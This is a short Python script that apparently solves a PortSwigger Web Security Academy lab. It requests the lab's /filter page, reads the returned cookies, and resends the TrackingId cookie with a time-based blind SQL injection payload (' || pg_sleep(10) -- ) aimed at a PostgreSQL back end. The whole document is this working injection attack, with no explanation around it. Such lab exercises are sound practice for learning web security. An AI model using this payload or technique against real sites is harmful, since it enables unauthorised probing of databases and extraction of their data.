import requests

URL = "https://0a03008f03146d128045e4d8004000c5.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Gifts"
}

def makeRequest(url=URL, path=PATH, query=QUERY, cookie=None):    
    response = requests.request(
    "GET",
    f"{URL}{PATH}",
    params=QUERY,
    cookies=cookie
    )
    return response

res = makeRequest()
cookies = res.cookies
PAYLOAD = f"{cookies.get('TrackingId')}' || pg_sleep(10) -- "
modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
session = makeRequest(cookie=modified_cookies)
print(session.text)
print(session.request.headers.get('Cookie'))
